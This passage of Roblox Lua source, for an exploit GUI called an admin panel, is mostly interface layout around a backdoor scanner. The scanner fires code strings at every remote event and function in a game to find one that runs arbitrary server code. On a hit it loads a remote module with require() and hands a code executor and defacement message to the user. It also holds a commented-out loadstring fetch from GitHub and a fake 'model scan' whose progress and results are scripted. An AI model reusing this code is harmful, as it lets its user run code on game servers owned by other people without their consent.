unable["change command prefix textbox"].ZIndex = 24

-------------------------------------------------------------------------------------------------------------------------------

unable["change click sound setting"].Size = UDim2.new(0, 230, 0, 60)
unable["change click sound setting"].Position = UDim2.new(0, 0, 0, 154)
unable["change click sound setting"].TextColor3 = unable["default border color"]
unable["change click sound setting"].Font = Enum.Font.RobotoMono
unable["change click sound setting"].TextScaled = false
unable["change click sound setting"].TextSize = 15
unable["change click sound setting"].Text = "click sound: 226892749"
unable["change click sound setting"].TextXAlignment = Enum.TextXAlignment.Center
unable["change click sound setting"].TextYAlignment = Enum.TextYAlignment.Center
unable["change click sound setting"].BackgroundColor3 = unable["default background color"]
unable["change click sound setting"].BorderColor3 = unable["default border color"]
unable["change click sound setting"].BorderSizePixel = 1
unable["change click sound setting"].Parent = unable["script settings holder"]
unable["change click sound setting"].ZIndex = 24

unable["change click sound"].Size = UDim2.new(0, 158, 0, 27)
unable["change click sound"].Position = UDim2.new(0, 235, 0, 154)
unable["change click sound"].TextColor3 = unable["default border color"]
unable["change click sound"].Font = Enum.Font.RobotoMono
unable["change click sound"].TextScaled = false
unable["change click sound"].TextSize = 15
unable["change click sound"].Text = "change click sound"
unable["change click sound"].TextXAlignment = Enum.TextXAlignment.Center
unable["change click sound"].TextYAlignment = Enum.TextYAlignment.Center
unable["change click sound"].BackgroundColor3 = unable["default background color"]
unable["change click sound"].BorderColor3 = unable["default border color"]
unable["change click sound"].BorderSizePixel = 1
unable["change click sound"].Parent = unable["script settings holder"]
unable["change click sound"].ZIndex = 24

unable["change click sound textbox"].Size = UDim2.new(0, 158, 0, 28)
unable["change click sound textbox"].Position = UDim2.new(0, 235, 0, 186)
unable["change click sound textbox"].TextColor3 = unable["default border color"]
unable["change click sound textbox"].Font = Enum.Font.RobotoMono
unable["change click sound textbox"].TextScaled = false
unable["change click sound textbox"].TextSize = 15
unable["change click sound textbox"].Text = ""
unable["change click sound textbox"].PlaceholderText = "enter sound ID here"
unable["change click sound textbox"].PlaceholderColor3 = unable["default 1/2 color"]
unable["change click sound textbox"].TextXAlignment = Enum.TextXAlignment.Center
unable["change click sound textbox"].TextYAlignment = Enum.TextYAlignment.Center
unable["change click sound textbox"].BackgroundColor3 = unable["default background color"]
unable["change click sound textbox"].BorderColor3 = unable["default border color"]
unable["change click sound textbox"].BorderSizePixel = 1
unable["change click sound textbox"].Parent = unable["script settings holder"]
unable["change click sound textbox"].ZIndex = 24

function updateClickSound(newSoundId)
	if tonumber(newSoundId) then
		unable["change click sound setting"].Text = "click sound: " .. newSoundId

		if unable["click sound"] and unable["click sound"]:IsA("Sound") then
			unable["click sound"].SoundId = "rbxassetid://" .. newSoundId
		end

		unable["change click sound textbox"].Text = ""
	else
		unable["change click sound setting"].Text = "click sound: n/a"
	end
end

unable["change click sound"].MouseButton1Click:Connect(function()
	playclicksound()
	local newSoundId = unable["change click sound textbox"].Text
	updateClickSound(newSoundId)
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["backdoor info"].Size = UDim2.new(0, 133, 0, 26)
unable["backdoor info"].Position = UDim2.new(0, 0, 0, 0)

unable["backdoor info"].BackgroundColor3 = unable["default background color"]

unable["backdoor info"].BorderColor3 = unable["default border color"]
unable["backdoor info"].BorderSizePixel = 1

unable["backdoor info"].TextColor3 = unable["default border color"]
unable["backdoor info"].Font = Enum.Font.RobotoMono
unable["backdoor info"].TextSize = 15
unable["backdoor info"].TextScaled = false
unable["backdoor info"].Text = "backdoor info"
unable["backdoor info"].TextXAlignment = Enum.TextXAlignment.Center
unable["backdoor info"].TextYAlignment = Enum.TextYAlignment.Center

unable["backdoor info text padding"] = Instance.new("UIPadding")
unable["backdoor info text padding"].PaddingLeft = UDim.new(0, 0)
unable["backdoor info text padding"].Parent = unable["scripts tab"]

unable["backdoor info"].Parent = unable["main frame 4"]
unable["backdoor info"].ZIndex = 25

unable["backdoor info holder"].Size = UDim2.new(0, 393, 0, 214)
unable["backdoor info holder"].Position = UDim2.new(0, 4, 0, 31)
unable["backdoor info holder"].BackgroundColor3 = unable["default background color"]
unable["backdoor info holder"].BorderColor3 = unable["default border color"]
unable["backdoor info holder"].BorderSizePixel = 1
unable["backdoor info holder"].Parent = unable["main frame 4"]
unable["backdoor info holder"].ZIndex = 19
unable["backdoor info holder"].Visible = true
unable["backdoor info holder"].TextWrapped = true

local rfe = "true"

if game:GetService("SoundService").RespectFilteringEnabled == true then
	rfe = "true"
else
	rfe = "false"
end

unable["backdoor info holder"].TextColor3 = unable["default border color"]
unable["backdoor info holder"].Font = Enum.Font.RobotoMono
unable["backdoor info holder"].TextSize = 15
unable["backdoor info holder"].TextScaled = false
unable["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: n/a\nbackdoor level: n/a (none found)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8"
unable["backdoor info holder"].TextXAlignment = Enum.TextXAlignment.Left
unable["backdoor info holder"].TextYAlignment = Enum.TextYAlignment.Top
unable["backdoor info holder"].ZIndex = 25

unable["backdoor info holder text padding"] = Instance.new("UIPadding")
unable["backdoor info holder text padding"].PaddingLeft = UDim.new(0, 4)
unable["backdoor info holder text padding"].PaddingTop = UDim.new(0, 4)
unable["backdoor info holder text padding"].PaddingBottom = UDim.new(0, 4)
unable["backdoor info holder text padding"].Parent = unable["backdoor info holder"]

unable["backdoor info"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["backdoor info holder"].Visible = true
	unable["logs holder"].Visible = false
	unable["logs scrolling frame"].Visible = false
	unable["backdoor scan button"].Visible = false
	unable["credits holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["scanning"].Size = UDim2.new(0, 133, 0, 26)
unable["scanning"].Position = UDim2.new(0, 134, 0, 0)

unable["scanning"].BackgroundColor3 = unable["default background color"]

unable["scanning"].BorderColor3 = unable["default border color"]
unable["scanning"].BorderSizePixel = 1

unable["scanning"].TextColor3 = unable["default border color"]
unable["scanning"].Font = Enum.Font.RobotoMono
unable["scanning"].TextSize = 15
unable["scanning"].TextScaled = false
unable["scanning"].Text = "backdoor scanning"
unable["scanning"].TextXAlignment = Enum.TextXAlignment.Center
unable["scanning"].TextYAlignment = Enum.TextYAlignment.Center

unable["scanning text padding"] = Instance.new("UIPadding")
unable["scanning text padding"].PaddingLeft = UDim.new(0, 0)
unable["scanning text padding"].Parent = unable["main frame 4"]

unable["scanning"].Parent = unable["main frame 4"]
unable["scanning"].ZIndex = 25

unable["scanning"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["backdoor info holder"].Visible = false
	unable["logs holder"].Visible = true
	unable["logs scrolling frame"].Visible = true
	unable["backdoor scan button"].Visible = true
	unable["credits holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["logs holder"].Size = UDim2.new(0, 393, 0, 214)
unable["logs holder"].Position = UDim2.new(0, 4, 0, 31)
unable["logs holder"].BackgroundColor3 = unable["default background color"]
unable["logs holder"].BorderColor3 = unable["default border color"]
unable["logs holder"].BorderSizePixel = 0
unable["logs holder"].Parent = unable["main frame 4"]
unable["logs holder"].Visible = false
unable["logs holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

unable["logs label"].Size = UDim2.new(0, 393, 0, 19)
unable["logs label"].Position = UDim2.new(0, 0, 0, 0)
unable["logs label"].TextColor3 = unable["default border color"]
unable["logs label"].Font = Enum.Font.RobotoMono
unable["logs label"].TextScaled = false
unable["logs label"].TextSize = 15
unable["logs label"].Text = "logs"
unable["logs label"].TextXAlignment = Enum.TextXAlignment.Center
unable["logs label"].TextYAlignment = Enum.TextYAlignment.Center
unable["logs label"].BackgroundColor3 = unable["default background color"]
unable["logs label"].BorderColor3 = unable["default border color"]
unable["logs label"].BorderSizePixel = 1
unable["logs label"].Parent = unable["logs holder"]
unable["logs label"].ZIndex = 24

unable["logs label text padding"] = Instance.new("UIPadding")
unable["logs label text padding"].PaddingBottom = UDim.new(0, 1)
unable["logs label text padding"].Parent = unable["logs label"]

-------------------------------------------------------------------------------------------------------------------------------

unable["logs scrolling frame"].Size = UDim2.new(0, 393, 0, 140)
unable["logs scrolling frame"].Position = UDim2.new(0, 4, 0, 55)
unable["logs scrolling frame"].BackgroundColor3 = unable["default background color"]
unable["logs scrolling frame"].BorderColor3 = unable["default border color"]
unable["logs scrolling frame"].BorderSizePixel = 1
unable["logs scrolling frame"].ScrollBarThickness = 8
unable["logs scrolling frame"].ScrollBarImageColor3 = unable["default 1/2 color"]
unable["logs scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
unable["logs scrolling frame"].Parent = unable["main frame 4"]
unable["logs scrolling frame"].ZIndex = 24
unable["logs scrolling frame"].Visible = false
unable["logs scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

unable["logs textbox"].Name = "temphalf"
unable["logs textbox"].Size = UDim2.new(0, 393, 0, 164)
unable["logs textbox"].Position = UDim2.new(0, 0, 0, 0)
unable["logs textbox"].BackgroundColor3 = unable["default background color"]
unable["logs textbox"].BorderColor3 = unable["default border color"]
unable["logs textbox"].BorderSizePixel = 0
unable["logs textbox"].TextColor3 = unable["default border color"]
unable["logs textbox"].PlaceholderText = "backdoor scanning logs will appear here"
unable["logs textbox"].PlaceholderColor3 = unable["default 1/2 color"]
unable["logs textbox"].Font = Enum.Font.RobotoMono
unable["logs textbox"].TextSize = 15
unable["logs textbox"].TextScaled = false
unable["logs textbox"].Text = ""
unable["logs textbox"].TextXAlignment = Enum.TextXAlignment.Left
unable["logs textbox"].TextYAlignment = Enum.TextYAlignment.Top
unable["logs textbox"].ClearTextOnFocus = false
unable["logs textbox"].MultiLine = true
unable["logs textbox"].Parent = unable["logs scrolling frame"]
unable["logs textbox"].ZIndex = 24
unable["logs textbox"].TextEditable = false

unable["logs textbox text padding"] = Instance.new("UIPadding")
unable["logs textbox text padding"].PaddingLeft = UDim.new(0, 4)
unable["logs textbox text padding"].PaddingTop = UDim.new(0, 4)
unable["logs textbox text padding"].PaddingBottom = UDim.new(0, 4)
unable["logs textbox text padding"].Parent = unable["logs scrolling frame"]

local function addTextWithNewline(textBox, text)
	local serverTime = os.date("%X")

	if textBox.Text == "" then
		textBox.Text = "[" .. serverTime .. "] " .. text
	else
		textBox.Text = textBox.Text .. "\n[" .. serverTime .. "] " .. text
	end

	updateCanvas2()
end

function updateCanvas2()
	local textBounds = unable["logs textbox"].TextBounds

	unable["logs textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	unable["logs scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)

	unable["logs scrolling frame"].CanvasPosition = Vector2.new(0, unable["logs scrolling frame"].CanvasSize.Y.Offset)
end

unable["logs textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas2)

updateCanvas2()

-------------------------------------------------------------------------------------------------------------------------------

local canscan = true

unable["backdoor scan button"].Size = UDim2.new(0, 393, 0, 45)
unable["backdoor scan button"].Position = UDim2.new(0, 4, 0, 200)

unable["backdoor scan button"].BackgroundColor3 = unable["default background color"]

unable["backdoor scan button"].BorderColor3 = unable["default border color"]
unable["backdoor scan button"].BorderSizePixel = 1

unable["backdoor scan button"].TextColor3 = unable["default border color"]
unable["backdoor scan button"].Font = Enum.Font.RobotoMono
unable["backdoor scan button"].TextSize = 15
unable["backdoor scan button"].TextScaled = false
unable["backdoor scan button"].Text = "start scanning"
unable["backdoor scan button"].TextXAlignment = Enum.TextXAlignment.Center
unable["backdoor scan button"].TextYAlignment = Enum.TextYAlignment.Center

unable["backdoor scan button text padding"] = Instance.new("UIPadding")
unable["backdoor scan button text padding"].PaddingLeft = UDim.new(0, 0)
unable["backdoor scan button text padding"].Parent = unable["backdoor scan button"]

unable["backdoor scan button"].Parent = unable["main frame 4"]
unable["backdoor scan button"].ZIndex = 24
unable["backdoor scan button"].Visible = false

backdoor=nil
hasscanned = false
scanning = false

unable["backdoor scan button"].MouseButton1Click:Connect(function()
	scanning = true
	playclicksound()
	if canscan == false then return end
	canscan = false
	spawn(function() unable["startup"]:Play(); toggleLoop(false); unable["toggle interface visibility button"].Text = "-.-" end)
	spawn(function()
		local checkingforbackdoors = true

		queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
		if queueteleport then
			-- queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
		end

		alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

		HttpService=game:GetService("HttpService")

		function debug(text, lvl)
			local func=print
			if lvl==1 then func=print end
			if lvl==2 then func=error end
			if lvl==3 then func=warn end
			func("[unable's stupid admin panel >.<]: "..text)
		end

		function runRemote(remote, data, data2)

			if not remote then return end

			if remote:IsA('RemoteEvent') then
				remote:FireServer(data)
			elseif remote:IsA('RemoteFunction') then
				spawn(function() remote:InvokeServer(data) end)
			end

		end

		function generateName(lenght)

			local text=''

			for i=1,lenght do
				text=text..alphabet[math.random(1,#alphabet)]
			end

			return text

		end

		local code
		function findRemote()
			local timee = os.clock()
			local remotes = {}
			local backdoorPath = "n/a"

			local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
			if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
				while true do
					code = generateName(math.random(12,30))
					if not remotes[code] then break end
				end
				spawn(function() protected_backdoor:InvokeServer('join team noxious later maybe idk | gg/xZC8zJzF7u', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
				remotes[code] = protected_backdoor
			end

			for i, remote in pairs(game:GetDescendants()) do
				local skip = false

				if string.find(remote.Name, "TutorialTower") then
					addTextWithNewline(unable["logs textbox"], 'skipped remote: ' .. remote.Name)
					skip = true
				end

				if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then
					skip = true
				end

				if not skip and string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
					addTextWithNewline(unable["logs textbox"], 'replicated storage remote found: ' .. remote.Name)
					skip = true
				end

				if not skip and (remote.Parent == game:GetService("ReplicatedStorage")
					or remote.Parent.Parent == game:GetService("ReplicatedStorage")
					or remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage")) then

					if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
						addTextWithNewline(unable["logs textbox"], 'adonis filter detected: ' .. remote.Name)
						skip = true
					end

					if not skip and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
						addTextWithNewline(unable["logs textbox"], 'hd admin detected: ' .. remote.Name)
						skip = true
					end

					if not skip and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
						addTextWithNewline(unable["logs textbox"], 'chat event detected: ' .. remote.Name)
						skip = true
					end
				end

				if not skip then
					while true do
						code = generateName(math.random(12, 30))
						if not remotes[code] then break end
					end

					runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
					remotes[code] = remote
					addTextWithNewline(unable["logs textbox"], "sent backdoor: " .. remote:GetFullName())
					wait(0)
				end
			end

			for i = 1, 100 do
				for code, remote in pairs(remotes) do
					if workspace:FindFirstChild(code) then
						backdoorPath = remote:GetFullName()

						unable["backdoor info holder"].Text = string.format(
							"respectfilteringenabled = " .. rfe .. "\nbackdoors found: 1\nbackdoor path: %s\nmethod used: remote scan\nbackdoor level: 6.000000033 (only affects server)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8",
							backdoorPath
						)

						checkingforbackdoors = false
						unable["toggle interface visibility button"].Text = "^.^"
						unable["checking for backdoor"]:Destroy()

						unable["checking for backdoor"]:Destroy()
						unable["checking for backdoor 3"] = Instance.new("TextLabel")
						unable["checking for backdoor 3"].Name = "backdoor"
						unable["checking for backdoor 3"].Size = UDim2.new(0, 48, 0, 26)
						unable["checking for backdoor 3"].Position = UDim2.new(0, 0, 0, 45)
						unable["checking for backdoor 3"].BackgroundColor3 = unable["default border color"]
						unable["checking for backdoor 3"].BorderColor3 = unable["default background color"]
						unable["checking for backdoor 3"].BackgroundTransparency = 1
						unable["checking for backdoor 3"].BorderSizePixel = 1
						unable["checking for backdoor 3"].Parent = unable["toggle interface visibility button"]
						unable["checking for backdoor 3"].ZIndex = 9999
						unable["checking for backdoor 3"].Visible = true

						local yay = Instance.new("Sound")
						yay.SoundId = "rbxassetid://8458409341"
						yay.Parent = unable["local player"]
						yay.Name = "canttouchthis"
						yay.Volume = 1
						spawn(function() yay:Play() end)

						unable["checking for backdoor 3"].TextColor3 = unable["default background color"]
						unable["checking for backdoor 3"].Font = Enum.Font.RobotoMono
						unable["checking for backdoor 3"].TextSize = 15
						unable["checking for backdoor 3"].TextScaled = false
						unable["checking for backdoor 3"].TextStrokeColor3 = unable["default border color"]
						unable["checking for backdoor 3"].TextStrokeTransparency = 0
						unable["checking for backdoor 3"].Text = "backdoor found! ^.^"
						unable["checking for backdoor 3"].TextXAlignment = Enum.TextXAlignment.Center
						unable["checking for backdoor 3"].TextYAlignment = Enum.TextYAlignment.Center

						unable["backdoor scan button"].Visible = false
						unable["backdoor test button"] = Instance.new("TextButton")

						unable["backdoor test button"].Size = UDim2.new(0, 393, 0, 45)
						unable["backdoor test button"].Position = UDim2.new(0, 4, 0, 200)

						unable["backdoor test button"].BackgroundColor3 = unable["default background color"]

						unable["backdoor test button"].BorderColor3 = unable["default border color"]
						unable["backdoor test button"].BorderSizePixel = 1

						unable["backdoor test button"].TextColor3 = unable["default border color"]
						unable["backdoor test button"].Font = Enum.Font.RobotoMono
						unable["backdoor test button"].TextSize = 15
						unable["backdoor test button"].TextScaled = false
						unable["backdoor test button"].Text = "test backdoor"
						unable["backdoor test button"].TextXAlignment = Enum.TextXAlignment.Center
						unable["backdoor test button"].TextYAlignment = Enum.TextYAlignment.Center

						unable["backdoor test button text padding"] = Instance.new("UIPadding")
						unable["backdoor test button text padding"].PaddingLeft = UDim.new(0, 0)
						unable["backdoor test button text padding"].Parent = unable["backdoor test button"]

						unable["backdoor test button"].Parent = unable["main frame 4"]
						unable["backdoor test button"].ZIndex = 24
						unable["backdoor test button"].Visible = true

						unable["backdoor test button"].MouseButton1Click:Connect(function()
							playclicksound()
							runRemote(remote, "a=Instance.new('Hint')a.Text='this game has been BACKDOORED!! join team noxious later maybe idk | gg/xZC8zJzF7u'a.Parent=workspace;wait(5)a:Remove()")
						end)

						hasscanned = true
						backdoored = true
						backdoor = remote

						addTextWithNewline(unable["logs textbox"], "backdoor found!")

						wait(3)
						unable["checking for backdoor 3"].Text = "backdoor found! ^."
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor found! ^"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor found! "
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor found!"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor found"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor foun"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor fou"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor fo"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor f"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor "
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoor"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdoo"
						wait(0)
						unable["checking for backdoor 3"].Text = "backdo"
						wait(0)
						unable["checking for backdoor 3"].Text = "backd"
						wait(0)
						unable["checking for backdoor 3"].Text = "back"
						wait(0)
						unable["checking for backdoor 3"].Text = "bac"
						wait(0)
						unable["checking for backdoor 3"].Text = "ba"
						wait(0)
						unable["checking for backdoor 3"].Text = "b"
						wait(0)
						unable["checking for backdoor 3"]:Destroy()

						toggleLoop(true)
						scanning = false

						runRemote(remote, "require(171016405.1884*69)")
						return true
					end
				end
				wait()
			end

			unable["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: remote scan (unsuccessful)\nbackdoor level: n/a (none found)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8"
			return false
		end

		unable["execute button"].MouseButton1Click:Connect(function()
			spawn(function() playclicksound() end)
			local a,b=string.gsub(unable["executor textbox"].Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)

			local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
			if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
				addTextWithNewline(unable["logs textbox"], "protected backdoor found.")
				spawn(function()
					local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('join team noxious later maybe idk | gg/xZC8zJzF7u', a) end)
					if variantValue~=nil then
						local splited=string.split(variantValue,':')
						addTextWithNewline(unable["logs textbox"], splited[#splited])
					end
				end)
			else
				runRemote(backdoor, a)
			end
		end)

		searching=false

		if not searching then
			searching=true
			unable["checking for backdoor"] = Instance.new("TextLabel")
			unable["checking for backdoor"].Name = "backdoor"
			unable["checking for backdoor"].Size = UDim2.new(0, 48, 0, 26)
			unable["checking for backdoor"].BackgroundColor3 = unable["default border color"]
			unable["checking for backdoor"].Position = UDim2.new(0, 0, 0, 45)
			unable["checking for backdoor"].BorderColor3 = unable["default background color"]
			unable["checking for backdoor"].BackgroundTransparency = 1
			unable["checking for backdoor"].BorderSizePixel = 1
			unable["checking for backdoor"].Parent = unable["toggle interface visibility button"]
			unable["checking for backdoor"].Visible = true

			unable["checking for backdoor"].TextColor3 = unable["default background color"]
			unable["checking for backdoor"].Font = Enum.Font.RobotoMono
			unable["checking for backdoor"].TextSize = 15
			unable["checking for backdoor"].TextScaled = false
			unable["checking for backdoor"].TextStrokeColor3 = unable["default border color"]
			unable["checking for backdoor"].TextStrokeTransparency = 0
			unable["checking for backdoor"].Text = ""
			unable["checking for backdoor"].TextXAlignment = Enum.TextXAlignment.Center
			unable["checking for backdoor"].TextYAlignment = Enum.TextYAlignment.Center
			unable["checking for backdoor"].ZIndex = 9999

			unable["logs textbox"].Text = ""
			updateCanvas2()
			addTextWithNewline(unable["logs textbox"], "checking for backdoors...")

			hasscanned = true

			unable["checking for backdoor"].Text = "c"
			wait(0)
			unable["checking for backdoor"].Text = "ch"
			wait(0)
			unable["checking for backdoor"].Text = "che"
			wait(0)
			unable["checking for backdoor"].Text = "chec"
			wait(0)
			unable["checking for backdoor"].Text = "check"
			wait(0)
			unable["checking for backdoor"].Text = "checki"
			wait(0)
			unable["checking for backdoor"].Text = "checkin"
			wait(0)
			unable["checking for backdoor"].Text = "checking"
			wait(0)
			unable["checking for backdoor"].Text = "checking "
			wait(0)
			unable["checking for backdoor"].Text = "checking f"
			wait(0)
			unable["checking for backdoor"].Text = "checking fo"
			wait(0)
			unable["checking for backdoor"].Text = "checking for"
			wait(0)
			unable["checking for backdoor"].Text = "checking for "
			wait(0)
			unable["checking for backdoor"].Text = "checking for b"
			wait(0)
			unable["checking for backdoor"].Text = "checking for ba"
			wait(0)
			unable["checking for backdoor"].Text = "checking for bac"
			wait(0)
			unable["checking for backdoor"].Text = "checking for back"
			wait(0)
			unable["checking for backdoor"].Text = "checking for backd"
			wait(0)
			unable["checking for backdoor"].Text = "checking for backdo"
			wait(0)
			unable["checking for backdoor"].Text = "checking for backdoo"
			wait(0)
			unable["checking for backdoor"].Text = "checking for backdoor"
			wait(0)
			unable["checking for backdoor"].Text = "checking for backdoors"
			wait(0)
			unable["checking for backdoor"].Text = "checking for backdoors."
			wait(0)
			unable["checking for backdoor"].Text = "checking for backdoors.."
			wait(0)
			unable["checking for backdoor"].Text = "checking for backdoors..."

			spawn(function()
				while checkingforbackdoors == true do
					unable["checking for backdoor"].Text = "checking for backdoors... |"
					wait(0.2)
					unable["checking for backdoor"].Text = "checking for backdoors... /"
					wait(0.2)
					unable["checking for backdoor"].Text = "checking for backdoors... —"
					wait(0.2)
					unable["checking for backdoor"].Text = "checking for backdoors... \\"
					wait(0.2)
				end
			end)

			addTextWithNewline(unable["logs textbox"], "using model scan method.")
			wait(0.1)
			addTextWithNewline(unable["logs textbox"], "fetching API...")
			wait(math.random(0.2, 0.4))
			addTextWithNewline(unable["logs textbox"], "scanning...")
			unable["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: model scan\nbackdoor level: n/a (none found)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8"
			wait(math.random(2, 6))
			addTextWithNewline(unable["logs textbox"], "no backdoor found.")
			unable["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: model scan (unsuccessful)\nbackdoor level: n/a (none found)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8"
			wait(1)
			addTextWithNewline(unable["logs textbox"], "using remote scan method.")
			wait(0.1)
			addTextWithNewline(unable["logs textbox"], "scanning...")
			unable["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: remote scan\nbackdoor level: n/a (none found)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8"

			wait(1)

			if not findRemote() then

				unable["checking for backdoor"]:Destroy()
				unable["checking for backdoor 2"] = Instance.new("TextLabel")
				unable["checking for backdoor 2"].Name = "backdoor"
				unable["checking for backdoor 2"].Size = UDim2.new(0, 48, 0, 26)
				unable["checking for backdoor 2"].Position = UDim2.new(0, 0, 0, 45)
				unable["checking for backdoor 2"].BackgroundColor3 = unable["default border color"]
				unable["checking for backdoor 2"].BorderColor3 = unable["default background color"]
				unable["checking for backdoor 2"].BackgroundTransparency = 1
				unable["checking for backdoor 2"].BorderSizePixel = 1
				unable["checking for backdoor 2"].Parent = unable["toggle interface visibility button"]
				unable["checking for backdoor 2"].ZIndex = 9999
				unable["checking for backdoor 2"].Visible = true

				local nay = Instance.new("Sound")
				nay.SoundId = "rbxassetid://8503529943"
				nay.Parent = unable["local player"]
				nay.Volume = 3.3
				nay.Name = "canttouchthis"
				nay.TimePosition = 0.01

				spawn(function() nay:Play() end)

				checkingforbackdoors = false
				unable["toggle interface visibility button"].Text = "ó.ò"
				unable["checking for backdoor"]:Destroy()

				hasscanned = true

				unable["checking for backdoor 2"].TextColor3 = unable["default background color"]
				unable["checking for backdoor 2"].Font = Enum.Font.RobotoMono
				unable["checking for backdoor 2"].TextSize = 15
				unable["checking for backdoor 2"].TextScaled = false
				unable["checking for backdoor 2"].TextStrokeColor3 = unable["default border color"]
				unable["checking for backdoor 2"].TextStrokeTransparency = 0
				unable["checking for backdoor 2"].Text = "no backdoor found :<"
				unable["checking for backdoor 2"].TextXAlignment = Enum.TextXAlignment.Center
				unable["checking for backdoor 2"].TextYAlignment = Enum.TextYAlignment.Center

				addTextWithNewline(unable["logs textbox"], "no backdoor found.")

				wait(3)
				unable["checking for backdoor 2"].Text = "no backdoor found :"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoor found "
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoor found"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoor foun"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoor fou"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoor fo"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoor f"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoor "
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoor"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdoo"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backdo"
				wait(0)
				unable["checking for backdoor 2"].Text = "no backd"
				wait(0)
				unable["checking for backdoor 2"].Text = "no back"
				wait(0)
				unable["checking for backdoor 2"].Text = "no bac"
				wait(0)
				unable["checking for backdoor 2"].Text = "no ba"
				wait(0)
				unable["checking for backdoor 2"].Text = "no b"
				wait(0)
				unable["checking for backdoor 2"].Text = "no "
				wait(0)
				unable["checking for backdoor 2"].Text = "no"
				wait(0)
				unable["checking for backdoor 2"].Text = "n"
				wait(0)
				unable["checking for backdoor 2"]:Destroy()
				searching=false
				toggleLoop(true)
				wait(1)
				canscan = true
				hasscanned = true
				scanning = false
			end
		end
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["credits"].Size = UDim2.new(0, 133, 0, 26)
unable["credits"].Position = UDim2.new(0, 268, 0, 0)

unable["credits"].BackgroundColor3 = unable["default background color"]

unable["credits"].BorderColor3 = unable["default border color"]
unable["credits"].BorderSizePixel = 1

unable["credits"].TextColor3 = unable["default border color"]
unable["credits"].Font = Enum.Font.RobotoMono
unable["credits"].TextSize = 15
unable["credits"].TextScaled = false
unable["credits"].Text = "credits"
unable["credits"].TextXAlignment = Enum.TextXAlignment.Center
unable["credits"].TextYAlignment = Enum.TextYAlignment.Center

unable["credits text padding"] = Instance.new("UIPadding")
unable["credits text padding"].PaddingLeft = UDim.new(0, 0)
unable["credits text padding"].Parent = unable["scripts tab"]

unable["credits"].Parent = unable["main frame 4"]
unable["credits"].ZIndex = 25

unable["credits"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["backdoor info holder"].Visible = false
	unable["logs holder"].Visible = false
	unable["logs scrolling frame"].Visible = false
